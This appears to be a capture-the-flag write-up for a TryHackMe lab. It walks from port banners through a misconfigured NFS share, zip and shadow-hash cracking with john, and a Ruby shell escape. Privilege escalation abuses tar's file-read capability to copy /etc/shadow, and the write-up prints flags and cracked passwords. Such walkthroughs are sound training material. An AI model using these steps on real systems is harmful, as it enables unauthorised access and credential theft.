> The Server From Hell

**export IP=10.10.59.207**

Start at port 1337 and enumerate your way.

nc $IP 1337

```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the ports
```

nmap -sV --script=banner -vv -p 1-100 $IP

And after looking at port 21 we got 

```
21/tcp  open  ftp?         syn-ack
| banner: 550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf
|_00
| fingerprint-strings: 
|   NULL: 
|_    550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
```

nc $IP 12345

```
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scan
```

showmount -e $IP

```
Export list for 10.10.197.116:
/home/nfs *
```

Let's create a mount point and mount the share.

mkdir /dev/shm/unknown
mount -t nfs $IP:/home/nfs /dev/shm/unknown

And looking at that location we got a password protected `backup.zip`.

## Cracking using john

zip2john backup.zip > backuphash
john backuphash --wordlist=/rockyou.txt

And we got the password `zxcvbnm` And unzipping we got 5 files.

# Flag.txt

```
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
````

In hints.txt file we are said to look at ports `2500-4500`.

for i in {2500..4500} ;do ssh -i id_rsa hades@$IP -p $i; done

We got a hit at port 3333. And we are in as hades. But it is an interactive ruby shell.

`system('/bin/bash')` And we have a stable shell!!

And we got our user.txt.

# user.txt

```
thm{sh3ll_3c4p3_15_v3ry_1337}
```

# Privilege Escalation

## Hint: getcap

Let's search for the capabilities.

getcap -r / 2>/dev/null

```
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

/bin/tar -cvf root.tar /etc/shadow
tar -xvf root.tar
cat /etc/shadow | grep root

And we can crack the hash using john.

john hash --wordlist=/usr/share/wordlists/rockyou.txt

```
trustno1         (root)
```

# root.txt

```
thm{w0w_n1c3_3sc4l4t10n}
```